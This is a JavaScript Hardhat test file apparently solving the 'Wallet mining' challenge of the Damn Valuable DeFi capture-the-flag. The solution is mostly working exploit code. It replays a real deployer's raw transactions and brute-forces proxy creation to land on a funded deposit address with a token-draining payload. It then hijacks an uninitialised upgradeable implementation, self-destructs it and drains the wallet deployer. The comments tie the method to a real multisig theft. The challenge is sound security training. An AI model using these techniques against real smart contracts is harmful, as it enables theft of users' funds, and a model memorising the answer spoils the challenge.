const { ethers, upgrades } = require("hardhat");
const { expect } = require("chai");
const deployer3Txs = require("./deployer3Txs.json");

describe("[Challenge] Wallet mining", function () {
  let deployer, player;
  let token, authorizer, walletDeployer;
  let initialWalletDeployerTokenBalance;

  const DEPOSIT_ADDRESS = "0x9b6fb606a9f5789444c17768c6dfcf2f83563801";
  const DEPOSIT_TOKEN_AMOUNT = 20000000n * 10n ** 18n;

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, ward, player] = await ethers.getSigners();

    // Deploy Damn Valuable Token contract
    token = await (
      await ethers.getContractFactory("DamnValuableToken", deployer)
    ).deploy();

    // Deploy authorizer with the corresponding proxy
    authorizer = await upgrades.deployProxy(
      await ethers.getContractFactory("AuthorizerUpgradeable", deployer),
      [[ward.address], [DEPOSIT_ADDRESS]], // initialization data
      { kind: "uups", initializer: "init" }
    );

    expect(await authorizer.owner()).to.eq(deployer.address);
    expect(await authorizer.can(ward.address, DEPOSIT_ADDRESS)).to.be.true;
    expect(await authorizer.can(player.address, DEPOSIT_ADDRESS)).to.be.false;

    // Deploy Safe Deployer contract
    walletDeployer = await (
      await ethers.getContractFactory("WalletDeployer", deployer)
    ).deploy(token.address);
    expect(await walletDeployer.chief()).to.eq(deployer.address);
    expect(await walletDeployer.gem()).to.eq(token.address);

    // Set Authorizer in Safe Deployer
    await walletDeployer.rule(authorizer.address);
    expect(await walletDeployer.mom()).to.eq(authorizer.address);

    await expect(
      walletDeployer.can(ward.address, DEPOSIT_ADDRESS)
    ).not.to.be.reverted;
    await expect(
      walletDeployer.can(player.address, DEPOSIT_ADDRESS)
    ).to.be.reverted;

    // Fund Safe Deployer with tokens
    initialWalletDeployerTokenBalance = (await walletDeployer.pay()).mul(43);
    await token.transfer(
      walletDeployer.address,
      initialWalletDeployerTokenBalance
    );

    // Ensure these accounts start empty
    expect(await ethers.provider.getCode(DEPOSIT_ADDRESS)).to.eq("0x");
    expect(await ethers.provider.getCode(await walletDeployer.fact())).to.eq(
      "0x"
    );
    expect(await ethers.provider.getCode(await walletDeployer.copy())).to.eq(
      "0x"
    );

    // Deposit large amount of DVT tokens to the deposit address
    await token.transfer(DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);

    // Ensure initial balances are set correctly
    expect(await token.balanceOf(DEPOSIT_ADDRESS)).eq(DEPOSIT_TOKEN_AMOUNT);
    expect(await token.balanceOf(walletDeployer.address)).eq(
      initialWalletDeployerTokenBalance
    );
    expect(await token.balanceOf(player.address)).eq(0);
  });

  it("Execution", async function () {
    /** CODE YOUR SOLUTION HERE */
    /**
     * Information about `fact` address: 0x76e2cfc1f5fa8f6a5b3fc4c8f4788f0116861f9b
     *
     * https://etherscan.io/address/0x76e2cfc1f5fa8f6a5b3fc4c8f4788f0116861f9b
     * https://inspexco.medium.com/how-20-million-op-was-stolen-from-the-multisig-wallet-not-yet-owned-by-wintermute-3f6c75db740a
     * https://techfi.tech/the-exploit-on-optimism-what-if-you-are-too-optimistic/
     *
     *
     * 0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F:
     * - Contract: GnosisSafe (Mastercopy 1.1.1)
     * - By: 0x1aa7451dd11b8cb16ac089ed7fe05efa00100a6a (Safe: Deployer 3)
     * - Tx: https://etherscan.io/tx/0x06d2fa464546e99d2147e1fc997ddb624cec9c8c5e25a050cc381ee8a384eed3
     *  - Nonce: 0
     *
     * 0x76e2cfc1f5fa8f6a5b3fc4c8f4788f0116861f9b:
     * - Contract: ProxyFactory (Proxy Factory 1.1.1)
     * - By: 0x1aa7451dd11b8cb16ac089ed7fe05efa00100a6a (Safe: Deployer 3)
     * - Tx: https://etherscan.io/tx/0x75a42f240d229518979199f56cd7c82e4fc1f1a20ad9a4864c635354b4a34261
     *  - Nonce: 2
     */
    const proxyFactoryAddr = await walletDeployer.connect(player).fact();
    expect(proxyFactoryAddr).to.eq(
      "0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B"
    );
    const masterCopyAddr = await walletDeployer.connect(player).copy();
    expect(masterCopyAddr).to.eq("0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F");

    // 1. Find programatically find the tx nonces of Deployer3 (easily verifiable via block explorer)
    const deployer3Addr = "0x1aa7451DD11b8cb16AC089ED7fE05eFa00100A6A";

    const nonceNotFound = -1;
    let masterCopyNonce = nonceNotFound;
    let proxyFactoryNonce = nonceNotFound;
    const maxNonceRounds = 100;

    for (let i = 0; i < maxNonceRounds; i++) {
      const contractAddr = ethers.utils.getContractAddress({
        from: deployer3Addr,
        nonce: i,
      });
      if (contractAddr === masterCopyAddr) {
        masterCopyNonce = i;
      } else if (contractAddr === proxyFactoryAddr) {
        proxyFactoryNonce = i;
      }
      if (
        masterCopyNonce !== nonceNotFound &&
        proxyFactoryNonce !== nonceNotFound
      ) {
        break;
      }
    }
    expect(masterCopyNonce).to.not.eq(nonceNotFound);
    expect(proxyFactoryNonce).to.not.eq(nonceNotFound);

    // 2. Replay Deployer3 0..2 tx on the Hardhat chain
    // NB: it requires first getting and saving the raw txs, and funding the Deployer3 address
    await player.sendTransaction({
      to: deployer3Addr,
      value: 65587410000000000n,
    });
    for (let i = 0; i < deployer3Txs.length; i++) {
      const { rawTx } = deployer3Txs[i];
      const tx = await ethers.provider.sendTransaction(rawTx); // NB: on behalf Deployer3
      await tx.wait();
    }

    // 3. Deploy an attacker that allows to transfer the 20 million DVTs from `DEPOSIT_ADDRESS`
    // (at 0x9b6fb606a9f5789444c17768c6dfcf2f83563801) to `player` address
    // The contract deployed at `DEPOSIT_ADDRESS` (`proxy`) will be deployed by
    // `ProxyFactory.createProxy(address masterCopy, bytes memory data)` at an unknown nonce.
    // And once `proxy` is deployed it will delegatecall `data` to the attacker
    const gnosisSafeProxyAttacker = await (
      await ethers.getContractFactory(
        "contracts/wallet-mining/GnosisSafeProxyAttacker.sol:GnosisSafeProxyAttacker",
        player
      )
    ).deploy();

    // NB: `ProxyFactory` from replayed tx is not the same one than in @gnosis.pm package. For
    // instance the event `ProxyCreation` (emitted by `createProxy()`) differs
    const proxyFactory = (
      await ethers.getContractFactory(
        "contracts/wallet-mining/ProxyFactory_5_3.sol:ProxyFactory"
      )
    ).attach(proxyFactoryAddr);

    // 4. Create as many proxies as needed until the deployed `proxy` address matches
    // `DEPOSIT_ADDRESS`. Encode as `data` the DVT transfer from `proxy` to `player`
    const dataWithProxyAttack =
      gnosisSafeProxyAttacker.interface.encodeFunctionData("exploit", [
        token.address,
        player.address,
      ]);
    let depositContractNonce = nonceNotFound;
    const iface = proxyFactory.interface;
    for (let i = 0; i < maxNonceRounds; i++) {
      const tx = await proxyFactory
        .connect(player)
        .createProxy(gnosisSafeProxyAttacker.address, dataWithProxyAttack);
      const receipt = await tx.wait();
      // NB: `ProxyCreation` event is the 2nd event to be emitted
      const { proxy } = iface.parseLog(receipt.logs[1]).args;
      // NB: format to lowercase `proxy` address cause `DEPOSIT_ADDRESS` is not checksum
      if (proxy.toLowerCase() === DEPOSIT_ADDRESS) {
        depositContractNonce = i;
        break;
      }
    }
    expect(depositContractNonce).to.not.eq(nonceNotFound); // NB: 42
    expect(await token.balanceOf(DEPOSIT_ADDRESS)).to.eq(0);
    expect(await token.balanceOf(player.address)).to.eq(DEPOSIT_TOKEN_AMOUNT);
    expect(await token.balanceOf(walletDeployer.address)).to.eq(
      initialWalletDeployerTokenBalance
    );

    // The only way to steal the 43 DVT from the initial wallet deployer is to call
    // `WalletDeployer.drop()`, which requires that `WalletDeployer.can()` returns `true`. To do so
    // `AuthorizeUpgradeable` implementation must be destroyed (more on this in the
    // `WalletDeployer.can()` inline comments)

    // 5. Get the implementation address of Authorizer (0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512)
    // and re-initialise its implementation (gaining the ownership)
    const implementationAddr = await upgrades.erc1967.getImplementationAddress(
      authorizer.address
    );
    const authorizerUpgradeableImplFactory = await ethers.getContractFactory(
      "AuthorizerUpgradeable"
    );
    const authorizerUpgradeableImpl =
      authorizerUpgradeableImplFactory.attach(implementationAddr);
    await authorizerUpgradeableImpl
      .connect(player)
      .init([player.address], [token.address]);

    // 6. Deploy the attacker that will be delegate called upon implementation update. Encode the
    // exploit call that selfs destructs the contract transferring the funds to the player
    const authorizerUpgradeableAttacker = await (
      await ethers.getContractFactory("AuthorizerUpgradeableAttacker", player)
    ).deploy();

    const dataWithWalletAttack =
      authorizerUpgradeableAttacker.interface.encodeFunctionData("exploit");
    await authorizerUpgradeableImpl
      .connect(player)
      .upgradeToAndCall(
        authorizerUpgradeableAttacker.address,
        dataWithWalletAttack
      );

    // 7. Call `drop()` 43 times to transfer all the 43 DVT to `player` (each transfer is limited to 1 DVT)
    const dropIterations = initialWalletDeployerTokenBalance.div(
      await walletDeployer.pay()
    );
    for (let i = 0; i < dropIterations; i++) {
      await walletDeployer.connect(player).drop([]);
    }
  });

  after(async function () {
    /** SUCCESS CONDITIONS */

    // Factory account must have code
    expect(
      await ethers.provider.getCode(await walletDeployer.fact())
    ).to.not.eq("0x");

    // Master copy account must have code
    expect(
      await ethers.provider.getCode(await walletDeployer.copy())
    ).to.not.eq("0x");

    // Deposit account must have code
    expect(await ethers.provider.getCode(DEPOSIT_ADDRESS)).to.not.eq("0x");

    // The deposit address and the Safe Deployer contract must not hold tokens
    expect(await token.balanceOf(DEPOSIT_ADDRESS)).to.eq(0);
    expect(await token.balanceOf(walletDeployer.address)).to.eq(0);

    // Player must own all tokens
    expect(await token.balanceOf(player.address)).to.eq(
      initialWalletDeployerTokenBalance.add(DEPOSIT_TOKEN_AMOUNT)
    );
  });
});
